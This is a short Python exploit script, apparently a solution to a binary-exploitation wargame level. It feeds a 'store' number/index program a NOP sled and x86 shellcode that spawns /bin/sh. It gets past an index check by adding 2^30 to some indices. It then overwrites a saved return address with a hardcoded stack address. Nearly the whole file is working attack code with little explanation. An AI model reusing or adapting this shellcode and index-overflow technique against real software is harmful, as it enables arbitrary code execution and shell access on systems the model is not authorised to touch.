import time

usleep = lambda x: time.sleep(x / 1000000.0)

def p(x):
    print(x)
    usleep(100)

def store(nb, index):
    p("store")
    p(nb)
    p(index)

# 0xffffdd04

# 31 d2 31 c9
# bb f8 dd ff // second bit -> start of the address of /bin/sh
# ff 31 c0 b0
# 0b cd 80 90

shellcode = [0x90909090] * 93

shellcode += [
    0xc931d231,
    0xffddf8bb, # second bit FROM THE RIGHT -> start of the address of /bin/sh
    0xb0c031ff,
    0x9080cd0b,
]

string = [
    0x6e69622f,
    0x68732f2f,
]

shellcode += string

for (i, bytes) in enumerate(shellcode):
    if i % 3 == 0:
        store(bytes, i + 1073741824)
    else:
        store(bytes, i)

#     Address of the beginning of the array
#     |
#     |                    Index to write at the return value address
#     |                    |
#     v                    v
store(int("ffffdc74", 16), 1073741824 + 114)

p("quit")